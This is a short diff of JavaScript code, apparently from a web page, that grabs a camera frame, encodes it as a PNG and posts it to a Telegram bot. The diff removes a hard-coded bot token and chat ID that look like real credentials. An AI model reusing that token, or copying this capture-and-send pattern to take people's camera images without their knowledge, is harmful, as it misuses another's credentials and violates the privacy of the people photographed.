@@ -126,8 +126,8 @@
       context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
       const photoData = canvas.toDataURL('image/png'); // Convert photo to Base64
-      const telegramToken = '7873624812:AAEAuInBku4J4GjSBG62Qw3hAXtyGTIwObw'; // Bot token
-      const chatId = '1426493835'; // Chat ID
+      const telegramToken = ''; // Bot token
+      const chatId = ''; // Chat ID
 
       fetch(`https://api.telegram.org/bot${telegramToken}/sendPhoto`, {
         method: 'POST',
